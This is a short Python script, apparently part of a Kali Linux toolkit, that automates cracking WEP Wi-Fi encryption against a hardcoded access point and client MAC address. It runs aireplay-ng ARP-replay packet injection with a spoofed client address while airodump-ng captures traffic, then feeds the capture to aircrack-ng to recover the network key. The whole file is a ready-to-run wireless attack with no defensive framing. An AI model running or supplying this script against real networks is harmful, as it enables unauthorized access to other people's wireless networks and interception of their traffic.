import subprocess as sb
from threading import Thread
import os
import time

directory = '/home/kali/Viper/results'
interface = 'wlan0'
ap_mac_address = '70:72:3C:C5:55:F3'
channel = '6'
c_mac = 'D0:37:45:7B:1F:85'
pcapfilewep=os.path.join(directory,'wepcracking')

def aireplay():
    os.system(f'timeout 15 aireplay-ng -3 -b {ap_mac_address} -h {c_mac} {interface}')
    
def airodump():
    os.system(f'timeout 15 airodump-ng --bssid {ap_mac_address} --channel {channel}  --write {pcapfilewep} {interface}')


sb.run(['iwconfig', interface, 'channel', channel])

a = Thread(target = aireplay)
b = Thread(target = airodump)
a.start()
b.start()

time.sleep(15)
a.join()
b.join()
# os.system(f'aircrack-ng {pcapfilewep}-01.cap')
os.system(f'timeout 10 aircrack-ng {pcapfilewep}-01.cap')
# third_command_wep=sb.run(['timeout','10','aircrack-ng',f'{pcapfilewep}-01.cap'],capture_output=True,text=True)
# print(third_command_wep.stdout)